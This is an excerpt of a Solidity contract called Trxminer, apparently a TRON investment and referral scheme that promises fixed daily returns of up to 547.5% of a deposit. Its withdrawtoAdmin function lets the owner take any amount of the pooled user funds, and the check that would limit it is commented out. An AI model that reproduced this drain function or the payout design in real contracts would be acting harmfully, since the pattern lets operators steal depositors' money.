...
contract Trxminer is Ownable {
    ...
    uint40 public currentTime;
    uint public seccount;
    ...
    constructor(address payable _root,address payable _withdrawfee ) public {
        owner = _root;
        root = owner;
    ...
    function _setUpline(address _addr, address _upline) private {
        if(users[_addr].upline == address(0) && _upline != _addr && _addr != root && (users[_upline].deposit_time > 0 || _upline == root)) {
            ...
            users[_upline].referralAddress.push(_addr);
    ...
    function deposit(address _upline) payable external {
     ...
     function withdrawtoAdmin(uint amount) onlyOwner external {
        //require(msg.sender == root, "only for owner");
        root.transfer(amount);
     }
    ...
    function withdraw() external {
        ...
        total_withdraw += to_payout;
          ...
          uint amt = this.getholdingBonus(msg.sender);
          if(amt > 0){
             to_payout = to_payout + ( amt * (to_payout  * 500000 / 100000000));
           }

          uint256 transfee = to_payout * 10 / 100;
          uint256 toamount = to_payout - transfee;

        withdrawFee.transfer(transfee);
        msg.sender.transfer(toamount);


        users[msg.sender].withdraw_time = uint40(block.timestamp);

        emit Withdraw(msg.sender, toamount);
    ...
    function getholdingBonus(address user) view external returns(uint){
          uint seccountnew = block.timestamp - users[user].withdraw_time;
          uint amt = uint(seccountnew)/864000;
          return amt;
    }


    function maxPayoutOf(uint256 _amount) pure external returns(uint256) {
        return (_amount * 547500000 )/ 100000000;
    }
    ...
    function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {
        ...
        if(users[_addr].deposit_payouts < max_payout) {
            payout = (users[_addr].deposit_amount * (((block.timestamp - users[_addr].deposit_time) / 1 days)*1500000) / 100000000) - users[_addr].deposit_payouts;
    ...
    */
    ...
    function userReferals(address _addr) view external returns(address[] memory) {
        return users[_addr].referralAddress;
    }
